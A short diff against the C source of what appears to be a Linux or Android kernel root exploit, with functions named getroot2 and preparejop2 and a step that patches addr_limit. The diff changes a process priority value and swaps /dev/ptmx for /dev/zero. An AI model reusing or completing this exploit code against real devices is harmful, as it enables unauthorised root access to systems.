@@ -254,7 +254,7 @@ static int setprocesspriority()
 {
 	int ret;
 	printf("[+] Changing process priority to highest\n");
-	if((ret = setpriority(PRIO_PROCESS, 0, -20)) == -1)
+	if((ret = setpriority(PRIO_PROCESS, 0, -19)) == -1)
 		perror("setpriority()");
 	return ret;
 }
@@ -340,7 +340,7 @@ int getroot2(struct offsets2* o)
 		return 1;
 
 	preparejop2(MMAP_START, o);
-	if((dev = open("/dev/ptmx", O_RDWR)) < 0)
+	if((dev = open("/dev/zero", O_RDWR)) < 0)
 		return 1;
 
 	printf("[+] Patching addr_limit\n");
